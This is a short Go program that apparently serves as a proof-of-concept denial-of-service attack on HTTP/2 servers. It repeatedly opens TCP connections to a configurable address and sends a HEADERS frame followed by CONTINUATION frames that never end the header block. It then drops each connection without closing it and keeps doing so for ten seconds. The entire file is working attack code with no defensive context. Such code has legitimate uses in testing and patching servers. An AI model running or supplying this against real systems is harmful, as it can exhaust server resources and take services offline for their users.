package main

import (
	"bytes"
	"flag"
	"log"
	"net"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	transportDefaultStreamFlow = 4 << 20
	maxFrameSize               = 1<<24 - 1
	maxHeaderListSize          = 10 << 20
	headerTableSize            = 4096
)

var (
	address string
)

func init() {
	flag.StringVar(&address, "address", ":7777", "server address")
	flag.Parse()

}

func main() {
	go connection()

	// Kill after 10 seconds without properly closing TCP conns
	done := time.After(10 * time.Second)
	<-done
	log.Println("BYE!")
}

func connection() {
	block := generateIndexedHeadersBlock()

MainLoop:
	for {
		conn, err := net.Dial("tcp", address)
		if err != nil {
			panic(err)
		}

		_, err = conn.Write([]byte(http2.ClientPreface))
		if err != nil {
			panic(err)
		}

		framer := http2.NewFramer(conn, conn)

		initialSettings := []http2.Setting{
			{ID: http2.SettingEnablePush, Val: 0},
			{ID: http2.SettingInitialWindowSize, Val: transportDefaultStreamFlow},
			{ID: http2.SettingMaxFrameSize, Val: maxFrameSize},
			{ID: http2.SettingMaxHeaderListSize, Val: maxHeaderListSize},
			{ID: http2.SettingHeaderTableSize, Val: headerTableSize},
		}
		err = framer.WriteSettings(initialSettings...)
		if err != nil {
			panic(err)
		}

		go func() {
			// Read init frames and others
			for {
				_, err := readPrintFrame(framer)
				if err != nil {
					if !strings.Contains(err.Error(), "use of closed network connection") {
						log.Println("Read", err)
					}
					break
				}
			}
		}()

		sentFrames := 0
		stream := uint32(1)

		for {
			if sentFrames == 0 {
				blockBuffer := bytes.Buffer{}
				henc := hpack.NewEncoder(&blockBuffer)
				henc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
				henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
				henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "http"})

				err = framer.WriteHeaders(http2.HeadersFrameParam{
					StreamID:      stream,
					EndStream:     false,
					EndHeaders:    false,
					BlockFragment: blockBuffer.Bytes(),
				})
			} else {
				err = framer.WriteContinuation(
					stream,
					false,
					block,
				)
			}
			if err != nil {
				log.Println("Write", err)
				continue MainLoop
			}

			sentFrames++
			if sentFrames == 2 {
				// Start new request without properly closing previous TCP conn
				continue MainLoop
			}
		}
	}
}

func generateIndexedHeadersBlock() []byte {
	blockBuffer := bytes.Buffer{}
	henc := hpack.NewEncoder(&blockBuffer)
	henc.WriteField(hpack.HeaderField{
		Name:  "header",
		Value: "header",
	})
	return blockBuffer.Bytes()
}

func readPrintFrame(framer *http2.Framer) (http2.Frame, error) {
	frame, err := framer.ReadFrame()
	if err != nil {
		return nil, err
	}

	log.Printf("Read frame: %+v\n", frame)

	return frame, nil
}
